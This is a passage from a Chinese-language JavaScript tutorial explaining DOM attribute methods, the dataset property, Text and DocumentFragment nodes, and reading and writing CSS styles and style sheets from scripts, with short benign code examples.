   注意，这种用法虽然可以读写属性，但是无法删除属性， ``delete`` 运算符在这里不会生效。

   HTML 元素的属性名是大小写不敏感的，但是 JavaScript 对象的属性名是大小写敏感的。转换规则是，转为 JavaScript 属性名时，一律采用小写。如果属性名包括多个单词，则采用骆驼拼写法，即从第二个单词开始，每个单词的首字母采用大写，比如 ``onClick`` 。

   有些 HTML 属性名是 JavaScript 的保留字，转为 JavaScript 属性时，必须改名。主要是以下两个。

   -  ``for`` 属性改为 ``htmlFor`` 
   -  ``class`` 属性改为 ``className`` 

   另外，HTML 属性值一般都是字符串，但是 JavaScript 属性会自动转换类型。比如，将字符串 ``true`` 转为布尔值，将 ``onClick`` 的值转为一个函数，将 ``style`` 属性的值转为一个 ``CSSStyleDeclaration`` 对象。因此，可以对这些属性赋予各种类型的值。

属性操作的标准方法
---------------


概述
~~~

   元素节点提供六个方法，用来操作属性。

   -  ``getAttribute()`` 
   -  ``getAttributeNames()`` 
   -  ``setAttribute()`` 
   -  ``hasAttribute()`` 
   -  ``hasAttributes()`` 
   -  ``removeAttribute()`` 

   这有几点注意。

   （1）适用性

   这六个方法对所有属性（包括用户自定义的属性）都适用。

   （2）返回值

    ``getAttribute()`` 只返回字符串，不会返回其他类型的值。

   （3）属性名

   这些方法只接受属性的标准名称，不用改写保留字，比如 ``for`` 和 ``class`` 都可以直接使用。另外，这些方法对于属性名是大小写不敏感的。

   .. code:: javascript

      var image = document.images[0];
      image.setAttribute('class', 'myImage');

   上面代码中， ``setAttribute`` 方法直接使用 ``class`` 作为属性名，不用写成 ``className`` 。

Element.getAttribute()
~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.getAttribute`` 方法返回当前元素节点的指定属性。如果指定属性不存在，则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码为
      // <div id="div1" align="left">
      var div = document.getElementById('div1');
      div.getAttribute('align') // "left"

Element.getAttributeNames()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.getAttributeNames()`` 返回一个数组，成员是当前元素的所有属性的名字。如果当前元素没有任何属性，则返回一个空数组。使用 ``Element.attributes`` 属性，也可以拿到同样的结果，唯一的区别是它返回的是类似数组的对象。

   .. code:: javascript

      var mydiv = document.getElementById('mydiv');
   
      mydiv.getAttributeNames().forEach(function (key) {
        var value = mydiv.getAttribute(key);
        console.log(key, value);
      })

   上面代码用于遍历某个节点的所有属性。

Element.setAttribute()
~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.setAttribute`` 方法用于为当前元素节点新增属性。如果同名属性已存在，则相当于编辑已存在的属性。该方法没有返回值。

   .. code:: javascript

      // HTML 代码为
      // <button>Hello World</button>
      var b = document.querySelector('button');
      b.setAttribute('name', 'myButton');
      b.setAttribute('disabled', true);

   上面代码中， ``button`` 元素的 ``name`` 属性被设成 ``myButton`` ， ``disabled`` 属性被设成 ``true`` 。

   这里有两个地方需要注意，首先，属性值总是字符串，其他类型的值会自动转成字符串，比如布尔值 ``true`` 就会变成字符串 ``true`` ；其次，上例的 ``disable`` 属性是一个布尔属性，对于 ``<button>`` 元素来说，这个属性不需要属性值，只要设置了就总是会生效，因此 ``setAttribute`` 方法里面可以将 ``disabled`` 属性设成任意值。

Element.hasAttribute()
~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.hasAttribute`` 方法返回一个布尔值，表示当前元素节点是否包含指定属性。

   .. code:: javascript

      var d = document.getElementById('div1');
   
      if (d.hasAttribute('align')) {
        d.setAttribute('align', 'center');
      }

   上面代码检查 ``div`` 节点是否含有 ``align`` 属性。如果有，则设置为居中对齐。

Element.hasAttributes()
~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.hasAttributes`` 方法返回一个布尔值，表示当前元素是否有属性，如果没有任何属性，就返回 ``false`` ，否则返回 ``true`` 。

   .. code:: javascript

      var foo = document.getElementById('foo');
      foo.hasAttributes() // true

Element.removeAttribute()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.removeAttribute`` 方法移除指定属性。该方法没有返回值。

   .. code:: javascript

      // HTML 代码为
      // <div id="div1" align="left" width="200px">
      document.getElementById('div1').removeAttribute('align');
      // 现在的HTML代码为
      // <div id="div1" width="200px">

dataset 属性
-----------

   有时，需要在HTML元素上附加数据，供 JavaScript 脚本使用。一种解决方法是自定义属性。

   .. code:: html

      <div id="mydiv" foo="bar">

   上面代码为 ``div`` 元素自定义了 ``foo`` 属性，然后可以用 ``getAttribute()`` 和 ``setAttribute()`` 读写这个属性。

   .. code:: javascript

      var n = document.getElementById('mydiv');
      n.getAttribute('foo') // bar
      n.setAttribute('foo', 'baz')

   这种方法虽然可以达到目的，但是会使得 HTML 元素的属性不符合标准，导致网页代码通不过校验。

   更好的解决方法是，使用标准提供的 ``data-*`` 属性。

   .. code:: html

      <div id="mydiv" data-foo="bar">

   然后，使用元素节点对象的 ``dataset`` 属性，它指向一个对象，可以用来操作 HTML 元素标签的 ``data-*`` 属性。

   .. code:: javascript

      var n = document.getElementById('mydiv');
      n.dataset.foo // bar
      n.dataset.foo = 'baz'

   上面代码中，通过 ``dataset.foo`` 读写 ``data-foo`` 属性。

   删除一个 ``data-*`` 属性，可以直接使用 ``delete`` 命令。

   .. code:: javascript

      delete document.getElementById('myDiv').dataset.foo;

   除了 ``dataset`` 属性，也可以用 ``getAttribute('data-foo')`` 、 ``removeAttribute('data-foo')`` 、 ``setAttribute('data-foo')`` 、 ``hasAttribute('data-foo')`` 等方法操作 ``data-*`` 属性。

   注意， ``data-`` 后面的属性名有限制，只能包含字母、数字、连词线（ ``-`` ）、点（ ``.`` ）、冒号（ ``:`` ）和下划线（ ``_`` )。而且，属性名不应该使用 ``A`` 到 ``Z`` 的大写字母，比如不能有 ``data-helloWorld`` 这样的属性名，而要写成 ``data-hello-world`` 。

   转成 ``dataset`` 的键名时，连词线后面如果跟着一个小写字母，那么连词线会被移除，该小写字母转为大写字母，其他字符不变。反过来， ``dataset`` 的键名转成属性名时，所有大写字母都会被转成连词线+该字母的小写形式，其他字符不变。比如， ``dataset.helloWorld`` 会转成 ``data-hello-world`` 。

/🟠 Text 节点和 DocumentFragment 节点
====================================

Text 节点的概念
-------------

   文本节点（ ``Text`` ）代表元素节点（ ``Element`` ）和属性节点（ ``Attribute`` ）的文本内容。如果一个节点只包含一段文本，那么它就有一个文本子节点，代表该节点的文本内容。

   通常我们使用父节点的 ``firstChild`` 、 ``nextSibling`` 等属性获取文本节点，或者使用 ``Document`` 节点的 ``createTextNode`` 方法创造一个文本节点。

   .. code:: javascript

      // 获取文本节点
      var textNode = document.querySelector('p').firstChild;
   
      // 创造文本节点
      var textNode = document.createTextNode('Hi');
      document.querySelector('div').appendChild(textNode);

   浏览器原生提供一个 ``Text`` 构造函数。它返回一个文本节点实例。它的参数就是该文本节点的文本内容。

   .. code:: javascript

      // 空字符串
      var text1 = new Text();
   
      // 非空字符串
      var text2 = new Text('This is a text node');

   注意，由于空格也是一个字符，所以哪怕只有一个空格，也会形成文本节点。比如， ``<p> </p>`` 包含一个空格，它的子节点就是一个文本节点。

   文本节点除了继承 ``Node`` 接口，还继承了 ``CharacterData`` 接口。 ``Node`` 接口的属性和方法请参考《Node 接口》一章，这里不再重复介绍了，以下的属性和方法大部分来自 ``CharacterData`` 接口。

Text 节点的属性
-------------


data
~~~~~

    ``data`` 属性等同于 ``nodeValue`` 属性，用来设置或读取文本节点的内容。

   .. code:: javascript

      // 读取文本内容
      document.querySelector('p').firstChild.data
      // 等同于
      document.querySelector('p').firstChild.nodeValue
   
      // 设置文本内容
      document.querySelector('p').firstChild.data = 'Hello World';

wholeText
~~~~~~~~~~

    ``wholeText`` 属性将当前文本节点与毗邻的文本节点，作为一个整体返回。大多数情况下， ``wholeText`` 属性的返回值，与 ``data`` 属性和 ``textContent`` 属性相同。但是，某些特殊情况会有差异。

   举例来说，HTML 代码如下。

   .. code:: html

      <p id="para">A <em>B</em> C</p>

   这时，文本节点的 ``wholeText`` 属性和 ``data`` 属性，返回值相同。

   .. code:: javascript

      var el = document.getElementById('para');
      el.firstChild.wholeText // "A "
      el.firstChild.data // "A "

   但是，一旦移除 ``<em>`` 节点， ``wholeText`` 属性与 ``data`` 属性就会有差异，因为这时其实 ``<p>`` 节点下面包含了两个毗邻的文本节点。

   .. code:: javascript

      el.removeChild(para.childNodes[1]);
      el.firstChild.wholeText // "A C"
      el.firstChild.data // "A "

length
~~~~~~~

    ``length`` 属性返回当前文本节点的文本长度。

   .. code:: javascript

      (new Text('Hello')).length // 5

nextElementSibling，previousElementSibling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``nextElementSibling`` 属性返回紧跟在当前文本节点后面的那个同级元素节点。如果取不到元素节点，则返回 ``null`` 。

   .. code:: javascript

      // HTML 为
      // <div>Hello <em>World</em></div>
      var tn = document.querySelector('div').firstChild;
      tn.nextElementSibling
      // <em>World</em>

    ``previousElementSibling`` 属性返回当前文本节点前面最近的同级元素节点。如果取不到元素节点，则返回 ``null：`` 。

Text 节点的方法
-------------


appendData()，deleteData()，insertData()，replaceData()，subStringData()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   以下5个方法都是编辑 ``Text`` 节点文本内容的方法。

   -  ``appendData()`` ：在 ``Text`` 节点尾部追加字符串。
   -  ``deleteData()`` ：删除 ``Text`` 节点内部的子字符串，第一个参数为子字符串开始位置，第二个参数为子字符串长度。
   -  ``insertData()`` ：在 ``Text`` 节点插入字符串，第一个参数为插入位置，第二个参数为插入的子字符串。
   -  ``replaceData()`` ：用于替换文本，第一个参数为替换开始位置，第二个参数为需要被替换掉的长度，第三个参数为新加入的字符串。
   -  ``subStringData()`` ：用于获取子字符串，第一个参数为子字符串在 ``Text`` 节点中的开始位置，第二个参数为子字符串长度。

   .. code:: javascript

      // HTML 代码为
      // <p>Hello World</p>
      var pElementText = document.querySelector('p').firstChild;
   
      pElementText.appendData('!');
      // 页面显示 Hello World!
      pElementText.deleteData(7, 5);
      // 页面显示 Hello W
      pElementText.insertData(7, 'Hello ');
      // 页面显示 Hello WHello
      pElementText.replaceData(7, 5, 'World');
      // 页面显示 Hello WWorld
      pElementText.substringData(7, 10);
      // 页面显示不变，返回"World "

remove()
~~~~~~~~~

    ``remove`` 方法用于移除当前 ``Text`` 节点。

   .. code:: javascript

      // HTML 代码为
      // <p>Hello World</p>
      document.querySelector('p').firstChild.remove()
      // 现在 HTML 代码为
      // <p></p>

splitText()
~~~~~~~~~~~~

    ``splitText`` 方法将 ``Text`` 节点一分为二，变成两个毗邻的 ``Text`` 节点。它的参数就是分割位置（从零开始），分割到该位置的字符前结束。如果分割位置不存在，将报错。

   分割后，该方法返回分割位置后方的字符串，而原 ``Text`` 节点变成只包含分割位置前方的字符串。

   .. code:: javascript

      // html 代码为 <p id="p">foobar</p>
      var p = document.getElementById('p');
      var textnode = p.firstChild;
   
      var newText = textnode.splitText(3);
      newText // "bar"
      textnode // "foo"

   父元素节点的 ``normalize`` 方法可以将毗邻的两个 ``Text`` 节点合并。

   接上面的例子，文本节点的 ``splitText`` 方法将一个 ``Text`` 节点分割成两个，父元素的 ``normalize`` 方法可以实现逆操作，将它们合并。

   .. code:: javascript

      p.childNodes.length // 2
   
      // 将毗邻的两个 Text 节点合并
      p.normalize();
      p.childNodes.length // 1

DocumentFragment 节点
--------------------

    ``DocumentFragment`` 节点代表一个文档的片段，本身就是一个完整的 DOM 树形结构。它没有父节点， ``parentNode`` 返回 ``null`` ，但是可以插入任意数量的子节点。它不属于当前文档，操作 ``DocumentFragment`` 节点，要比直接操作 DOM 树快得多。

   它一般用于构建一个 DOM 结构，然后插入当前文档。 ``document.createDocumentFragment`` 方法，以及浏览器原生的 ``DocumentFragment`` 构造函数，可以创建一个空的 ``DocumentFragment`` 节点。然后再使用其他 DOM 方法，向其添加子节点。

   .. code:: javascript

      var docFrag = document.createDocumentFragment();
      // 等同于
      var docFrag = new DocumentFragment();
   
      var li = document.createElement('li');
      li.textContent = 'Hello World';
      docFrag.appendChild(li);
   
      document.querySelector('ul').appendChild(docFrag);

   上面代码创建了一个 ``DocumentFragment`` 节点，然后将一个 ``li`` 节点添加在它里面，最后将 ``DocumentFragment`` 节点移动到原文档。

   注意， ``DocumentFragment`` 节点本身不能被插入当前文档。当它作为 ``appendChild()`` 、 ``insertBefore()`` 、 ``replaceChild()`` 等方法的参数时，是它的所有子节点插入当前文档，而不是它自身。一旦 ``DocumentFragment`` 节点被添加进当前文档，它自身就变成了空节点（ ``textContent`` 属性为空字符串），可以被再次使用。如果想要保存 ``DocumentFragment`` 节点的内容，可以使用 ``cloneNode`` 方法。

   .. code:: javascript

      document
        .querySelector('ul')
        .appendChild(docFrag.cloneNode(true));

   上面这样添加 ``DocumentFragment`` 节点进入当前文档，不会清空 ``DocumentFragment`` 节点。

   下面是一个例子，使用 ``DocumentFragment`` 反转一个指定节点的所有子节点的顺序。

   .. code:: javascript

      function reverse(n) {
        var f = document.createDocumentFragment();
        while(n.lastChild) f.appendChild(n.lastChild);
        n.appendChild(f);
      }

    ``DocumentFragment`` 节点对象没有自己的属性和方法，全部继承自 ``Node`` 节点和 ``ParentNode`` 接口。也就是说， ``DocumentFragment`` 节点比 ``Node`` 节点多出以下四个属性。

   -  ``children`` ：返回一个动态的 ``HTMLCollection`` 集合对象，包括当前 ``DocumentFragment`` 对象的所有子元素节点。
   -  ``firstElementChild`` ：返回当前 ``DocumentFragment`` 对象的第一个子元素节点，如果没有则返回 ``null`` 。
   -  ``lastElementChild`` ：返回当前 ``DocumentFragment`` 对象的最后一个子元素节点，如果没有则返回 ``null`` 。
   -  ``childElementCount`` ：返回当前 ``DocumentFragment`` 对象的所有子元素数量。

/🟠 CSS 操作
============

   CSS 与 JavaScript 是两个有着明确分工的领域，前者负责页面的视觉效果，后者负责与用户的行为互动。但是，它们毕竟同属网页开发的前端，因此不可避免有着交叉和互相配合。本章介绍如何通过 JavaScript 操作 CSS。

HTML 元素的 style 属性
--------------------

   操作 CSS 样式最简单的方法，就是使用网页元素节点的 ``getAttribute()`` 方法、 ``setAttribute()`` 方法和 ``removeAttribute()`` 方法，直接读写或删除网页元素的 ``style`` 属性。

   .. code:: javascript

      div.setAttribute(
        'style',
        'background-color:red;' + 'border:1px solid black;'
      );

   上面的代码相当于下面的 HTML 代码。

   .. code:: html

      <div style="background-color:red; border:1px solid black;" />

    ``style`` 不仅可以使用字符串读写，它本身还是一个对象，部署了 CSSStyleDeclaration 接口（详见下面的介绍），可以直接读写个别属性。

   .. code:: javascript

      e.style.fontSize = '18px';
      e.style.color = 'black';

CSSStyleDeclaration 接口
-----------------------


简介
~~~

   CSSStyleDeclaration 接口用来操作元素的样式。三个地方部署了这个接口。

   - 元素节点的 ``style`` 属性（ ``Element.style`` ）
   -  ``CSSStyle`` 实例的 ``style`` 属性
   -  ``window.getComputedStyle()`` 的返回值

   CSSStyleDeclaration 接口可以直接读写 CSS 的样式属性，不过，连词号需要变成骆驼拼写法。

   .. code:: javascript

      var divStyle = document.querySelector('div').style;
   
      divStyle.backgroundColor = 'red';
      divStyle.border = '1px solid black';
      divStyle.width = '100px';
      divStyle.height = '100px';
      divStyle.fontSize = '10em';
   
      divStyle.backgroundColor // red
      divStyle.border // 1px solid black
      divStyle.height // 100px
      divStyle.width // 100px

   上面代码中， ``style`` 属性的值是一个 CSSStyleDeclaration 实例。这个对象所包含的属性与 CSS 规则一一对应，但是名字需要改写，比如 ``background-color`` 写成 ``backgroundColor`` 。改写的规则是将横杠从 CSS 属性名中去除，然后将横杠后的第一个字母大写。如果 CSS 属性名是 JavaScript 保留字，则规则名之前需要加上字符串 ``css`` ，比如 ``float`` 写成 ``cssFloat`` 。

   注意，该对象的属性值都是字符串，设置时必须包括单位，但是不含规则结尾的分号。比如， ``divStyle.width`` 不能写为 ``100`` ，而要写为 ``100px`` 。

   另外， ``Element.style`` 返回的只是行内样式，并不是该元素的全部样式。通过样式表设置的样式，或者从父元素继承的样式，无法通过这个属性得到。元素的全部样式要通过 ``window.getComputedStyle()`` 得到。

CSSStyleDeclaration 实例属性
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   **（1）CSSStyleDeclaration.cssText**

    ``CSSStyleDeclaration.cssText`` 属性用来读写当前规则的所有样式声明文本。

   .. code:: javascript

      var divStyle = document.querySelector('div').style;
   
      divStyle.cssText = 'background-color: red;'
        + 'border: 1px solid black;'
        + 'height: 100px;'
        + 'width: 100px;';

   注意， ``cssText`` 的属性值不用改写 CSS 属性名。

   删除一个元素的所有行内样式，最简便的方法就是设置 ``cssText`` 为空字符串。

   .. code:: javascript

      divStyle.cssText = '';

   **（2）CSSStyleDeclaration.length**

    ``CSSStyleDeclaration.length`` 属性返回一个整数值，表示当前规则包含多少条样式声明。

   .. code:: javascript

      // HTML 代码如下
      // <div id="myDiv"
      //   style="height: 1px;width: 100%;background-color: #CA1;"
      // ></div>
      var myDiv = document.getElementById('myDiv');
      var divStyle = myDiv.style;
      divStyle.length // 3

   上面代码中， ``myDiv`` 元素的行内样式共包含3条样式规则。

   **（3）CSSStyleDeclaration.parentRule**

    ``CSSStyleDeclaration.parentRule`` 属性返回当前规则所属的那个样式块（CSSRule 实例）。如果不存在所属的样式块，该属性返回 ``null`` 。

   该属性只读，且只在使用 CSSRule 接口时有意义。

   .. code:: javascript

      var declaration = document.styleSheets[0].rules[0].style;
      declaration.parentRule === document.styleSheets[0].rules[0]
      // true

CSSStyleDeclaration 实例方法
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   **（1）CSSStyleDeclaration.getPropertyPriority()**

    ``CSSStyleDeclaration.getPropertyPriority`` 方法接受 CSS 样式的属性名作为参数，返回一个字符串，表示有没有设置 ``important`` 优先级。如果有就返回 ``important`` ，否则返回空字符串。

   .. code:: javascript

      // HTML 代码为
      // <div id="myDiv" style="margin: 10px!important; color: red;"/>
      var style = document.getElementById('myDiv').style;
      style.margin // "10px"
      style.getPropertyPriority('margin') // "important"
      style.getPropertyPriority('color') // ""

   上面代码中， ``margin`` 属性有 ``important`` 优先级， ``color`` 属性没有。

   **（2）CSSStyleDeclaration.getPropertyValue()**

    ``CSSStyleDeclaration.getPropertyValue`` 方法接受 CSS 样式属性名作为参数，返回一个字符串，表示该属性的属性值。

   .. code:: javascript

      // HTML 代码为
      // <div id="myDiv" style="margin: 10px!important; color: red;"/>
      var style = document.getElementById('myDiv').style;
      style.margin // "10px"
      style.getPropertyValue("margin") // "10px"

   **（3）CSSStyleDeclaration.item()**

    ``CSSStyleDeclaration.item`` 方法接受一个整数值作为参数，返回该位置的 CSS 属性名。

   .. code:: javascript

      // HTML 代码为
      // <div id="myDiv" style="color: red; background-color: white;"/>
      var style = document.getElementById('myDiv').style;
      style.item(0) // "color"
      style.item(1) // "background-color"

   上面代码中， ``0`` 号位置的 CSS 属性名是 ``color`` ， ``1`` 号位置的 CSS 属性名是 ``background-color`` 。

   如果没有提供参数，这个方法会报错。如果参数值超过实际的属性数目，这个方法返回一个空字符值。

   **（4）CSSStyleDeclaration.removeProperty()**

    ``CSSStyleDeclaration.removeProperty`` 方法接受一个属性名作为参数，在 CSS 规则里面移除这个属性，返回这个属性原来的值。

   .. code:: javascript

      // HTML 代码为
      // <div id="myDiv" style="color: red; background-color: white;">
      //   111
      // </div>
      var style = document.getElementById('myDiv').style;
      style.removeProperty('color') // 'red'
      // HTML 代码变为
      // <div id="myDiv" style="background-color: white;">

   上面代码中，删除 ``color`` 属性以后，字体颜色从红色变成默认颜色。

   **（5）CSSStyleDeclaration.setProperty()**

    ``CSSStyleDeclaration.setProperty`` 方法用来设置新的 CSS 属性。该方法没有返回值。

   该方法可以接受三个参数。

   - 第一个参数：属性名，该参数是必需的。
   - 第二个参数：属性值，该参数可选。如果省略，则参数值默认为空字符串。
   - 第三个参数：优先级，该参数可选。如果设置，唯一的合法值是 ``important`` ，表示 CSS 规则里面的 ``!important`` 。

   .. code:: javascript

      // HTML 代码为
      // <div id="myDiv" style="color: red; background-color: white;">
      //   111
      // </div>
      var style = document.getElementById('myDiv').style;
      style.setProperty('border', '1px solid blue');

   上面代码执行后， ``myDiv`` 元素就会出现蓝色的边框。

CSS 模块的侦测
------------

   CSS 的规格发展太快，新的模块层出不穷。不同浏览器的不同版本，对 CSS 模块的支持情况都不一样。有时候，需要知道当前浏览器是否支持某个模块，这就叫做“CSS模块的侦测”。

   一个比较普遍适用的方法是，判断元素的 ``style`` 对象的某个属性值是否为字符串。

   .. code:: javascript

      typeof element.style.animationName === 'string';
      typeof element.style.transform === 'string';

   如果该 CSS 属性确实存在，会返回一个字符串。即使该属性实际上并未设置，也会返回一个空字符串。如果该属性不存在，则会返回 ``undefined`` 。

   .. code:: javascript

      document.body.style['maxWidth'] // ""
      document.body.style['maximumWidth'] // undefined

   上面代码说明，这个浏览器支持 ``max-width`` 属性，但是不支持 ``maximum-width`` 属性。

   注意，不管 CSS 属性名的写法带不带连词线， ``style`` 属性上都能反映出该属性是否存在。

   .. code:: javascript

      document.body.style['backgroundColor'] // ""
      document.body.style['background-color'] // ""

   另外，使用的时候，需要把不同浏览器的 CSS 前缀也考虑进去。

   .. code:: javascript

      var content = document.getElementById('content');
      typeof content.style['webkitAnimation'] === 'string'

   这种侦测方法可以写成一个函数。

   .. code:: javascript

      function isPropertySupported(property) {
        if (property in document.body.style) return true;
        var prefixes = ['Moz', 'Webkit', 'O', 'ms', 'Khtml'];
        var prefProperty = property.charAt(0).toUpperCase() + property.substr(1);
   
        for(var i = 0; i < prefixes.length; i++){
          if((prefixes[i] + prefProperty) in document.body.style) return true;
        }
   
        return false;
      }
   
      isPropertySupported('background-clip')
      // true

CSS 对象
-------

   浏览器原生提供 CSS 对象，为 JavaScript 操作 CSS 提供一些工具方法。

   这个对象目前有两个静态方法。

CSS.escape()
~~~~~~~~~~~~~

    ``CSS.escape`` 方法用于转义 CSS 选择器里面的特殊字符。

   .. code:: html

      <div id="foo#bar">

   上面代码中，该元素的 ``id`` 属性包含一个 ``#`` 号，该字符在 CSS 选择器里面有特殊含义。不能直接写成 ``document.querySelector('#foo#bar')`` ，只能写成 ``document.querySelector('#foo\\#bar')`` 。这里必须使用双斜杠的原因是，单引号字符串本身会转义一次斜杠。

    ``CSS.escape`` 方法就用来转义那些特殊字符。

   .. code:: javascript

      document.querySelector('#' + CSS.escape('foo#bar'))

CSS.supports()
~~~~~~~~~~~~~~~

    ``CSS.supports`` 方法返回一个布尔值，表示当前环境是否支持某一句 CSS 规则。

   它的参数有两种写法，一种是第一个参数是属性名，第二个参数是属性值；另一种是整个参数就是一行完整的 CSS 语句。

   .. code:: javascript

      // 第一种写法
      CSS.supports('transform-origin', '5px') // true
   
      // 第二种写法
      CSS.supports('display: table-cell') // true

   注意，第二种写法的参数结尾不能带有分号，否则结果不准确。

   .. code:: javascript

      CSS.supports('display: table-cell;') // false

window.getComputedStyle()
--------------------------

   行内样式（inline style）具有最高的优先级，改变行内样式，通常会立即反映出来。但是，网页元素最终的样式是综合各种规则计算出来的。因此，如果想得到元素实际的样式，只读取行内样式是不够的，需要得到浏览器最终计算出来的样式规则。

    ``window.getComputedStyle()`` 方法，就用来返回浏览器计算后得到的最终规则。它接受一个节点对象作为参数，返回一个 CSSStyleDeclaration 实例，包含了指定节点的最终样式信息。所谓“最终样式信息”，指的是各种 CSS 规则叠加后的结果。

   .. code:: javascript

      var div = document.querySelector('div');
      var styleObj = window.getComputedStyle(div);
      styleObj.backgroundColor

   上面代码中，得到的背景色就是 ``div`` 元素真正的背景色。

   注意，CSSStyleDeclaration 实例是一个活的对象，任何对于样式的修改，会实时反映到这个实例上面。另外，这个实例是只读的。

    ``getComputedStyle`` 方法还可以接受第二个参数，表示当前元素的伪元素（比如 ``:before`` 、 ``:after`` 、 ``:first-line`` 、 ``:first-letter`` 等）。

   .. code:: javascript

      var result = window.getComputedStyle(div, ':before');

   下面的例子是如何获取元素的高度。

   .. code:: javascript

      var elem = document.getElementById('elem-container');
      var styleObj = window.getComputedStyle(elem, null)
      var height = styleObj.height;
      // 等同于
      var height = styleObj['height'];
      var height = styleObj.getPropertyValue('height');

   上面代码得到的 ``height`` 属性，是浏览器最终渲染出来的高度，比其他方法得到的高度更可靠。由于 ``styleObj`` 是 CSSStyleDeclaration 实例，所以可以使用各种 CSSStyleDeclaration 的实例属性和方法。

   有几点需要注意。

   - CSSStyleDeclaration 实例返回的 CSS 值都是绝对单位。比如，长度都是像素单位（返回值包括 ``px`` 后缀），颜色是 ``rgb(#, #, #)`` 或 ``rgba(#, #, #, #)`` 格式。
   - CSS 规则的简写形式无效。比如，想读取 ``margin`` 属性的值，不能直接读，只能读 ``marginLeft`` 、 ``marginTop`` 等属性；再比如， ``font`` 属性也是不能直接读的，只能读 ``font-size`` 等单个属性。
   - 如果读取 CSS 原始的属性名，要用方括号运算符，比如 ``styleObj['z-index']`` ；如果读取骆驼拼写法的 CSS 属性名，可以直接读取 ``styleObj.zIndex`` 。
   - 该方法返回的 CSSStyleDeclaration 实例的 ``cssText`` 属性总是返回空字符串。

CSS 伪元素
---------

   CSS 伪元素是通过 CSS 向 DOM 添加的元素，主要是通过 ``:before`` 和 ``:after`` 选择器生成，然后用 ``content`` 属性指定伪元素的内容。

   下面是一段 HTML 代码。

   .. code:: html

      <div id="test">Test content</div>

   CSS 添加伪元素 ``:before`` 的写法如下。

   .. code:: css

   
     content: 'Before ';
     color: #FF0;
   }
```

   节点元素的 ``style`` 对象无法读写伪元素的样式，这时就要用到 ``window.getComputedStyle()`` 。JavaScript 获取伪元素，可以使用下面的方法。

   .. code:: javascript

      var test = document.querySelector('#test');
   
      var result = window.getComputedStyle(test, ':before').content;
      var color = window.getComputedStyle(test, ':before').color;

   此外，也可以使用 CSSStyleDeclaration 实例的 ``getPropertyValue`` 方法，获取伪元素的属性。

   .. code:: javascript

      var result = window.getComputedStyle(test, ':before')
        .getPropertyValue('content');
      var color = window.getComputedStyle(test, ':before')
        .getPropertyValue('color');

StyleSheet 接口
--------------


概述
~~~

    ``StyleSheet`` 接口代表网页的一张样式表，包括 ``<link>`` 元素加载的样式表和 ``<style>`` 元素内嵌的样式表。

    ``document`` 对象的 ``styleSheets`` 属性，可以返回当前页面的所有 ``StyleSheet`` 实例（即所有样式表）。它是一个类似数组的对象。

   .. code:: javascript

      var sheets = document.styleSheets;
      var sheet = document.styleSheets[0];
      sheet instanceof StyleSheet // true

   如果是 ``<style>`` 元素嵌入的样式表，还有另一种获取 ``StyleSheet`` 实例的方法，就是这个节点元素的 ``sheet`` 属性。

   .. code:: javascript

      // HTML 代码为 <style id="myStyle"></style>
      var myStyleSheet = document.getElementById('myStyle').sheet;
      myStyleSheet instanceof StyleSheet // true

   严格地说， ``StyleSheet`` 接口不仅包括网页样式表，还包括 XML 文档的样式表。所以，它有一个子类 ``CSSStyleSheet`` 表示网页的 CSS 样式表。我们在网页里面拿到的样式表实例，实际上是 ``CSSStyleSheet`` 的实例。这个子接口继承了 ``StyleSheet`` 的所有属性和方法，并且定义了几个自己的属性，下面把这两个接口放在一起介绍。

实例属性
~~~~~~~

    ``StyleSheet`` 实例有以下属性。

   **（1）StyleSheet.disabled**

    ``StyleSheet.disabled`` 返回一个布尔值，表示该样式表是否处于禁用状态。手动设置 ``disabled`` 属性为 ``true`` ，等同于在 ``<link>`` 元素里面，将这张样式表设为 ``alternate stylesheet`` ，即该样式表将不会生效。

   注意， ``disabled`` 属性只能在 JavaScript 脚本中设置，不能在 HTML 语句中设置。

   **（2）StyleSheet.href**

    ``StyleSheet.href`` 返回样式表的网址。对于内嵌样式表，该属性返回 ``null`` 。该属性只读。

   .. code:: javascript

      document.styleSheets[0].href

   **（3）StyleSheet.media**

    ``StyleSheet.media`` 属性返回一个类似数组的对象（ ``MediaList`` 实例），成员是表示适用媒介的字符串。表示当前样式表是用于屏幕（screen），还是用于打印（print）或手持设备（handheld），或各种媒介都适用（all）。该属性只读，默认值是 ``screen`` 。

   .. code:: javascript

      document.styleSheets[0].media.mediaText
      // "all"

    ``MediaList`` 实例的 ``appendMedium`` 方法，用于增加媒介； ``deleteMedium`` 方法用于删除媒介。

   .. code:: javascript

      document.styleSheets[0].media.appendMedium('handheld');
      document.styleSheets[0].media.deleteMedium('print');

   **（4）StyleSheet.title**

    ``StyleSheet.title`` 属性返回样式表的 ``title`` 属性。

   **（5）StyleSheet.type**

    ``StyleSheet.type`` 属性返回样式表的 ``type`` 属性，通常是 ``text/css`` 。

   .. code:: javascript

      document.styleSheets[0].type  // "text/css"

   **（6）StyleSheet.parentStyleSheet**

   CSS 的 ``@import`` 命令允许在样式表中加载其他样式表。 ``StyleSheet.parentStyleSheet`` 属性返回包含了当前样式表的那张样式表。如果当前样式表是顶层样式表，则该属性返回 ``null`` 。

   .. code:: javascript

      if (stylesheet.parentStyleSheet) {
        sheet = stylesheet.parentStyleSheet;
      } else {
        sheet = stylesheet;
      }

   **（7）StyleSheet.ownerNode**

    ``StyleSheet.ownerNode`` 属性返回 ``StyleSheet`` 对象所在的 DOM 节点，通常是 ``<link>`` 或 ``<style>`` 。对于那些由其他样式表引用的样式表，该属性为 ``null`` 。

   .. code:: javascript

      // HTML代码为
      // <link rel="StyleSheet" href="example.css" type="text/css" />
      document.styleSheets[0].ownerNode // [object HTMLLinkElement]

   **（8）CSSStyleSheet.cssRules**

    ``CSSStyleSheet.cssRules`` 属性指向一个类似数组的对象（ ``CSSRuleList`` 实例），里面每一个成员就是当前样式表的一条 CSS 规则。使用该规则的 ``cssText`` 属性，可以得到 CSS 规则对应的字符串。

   .. code:: javascript

      var sheet = document.querySelector('#styleElement').sheet;
   
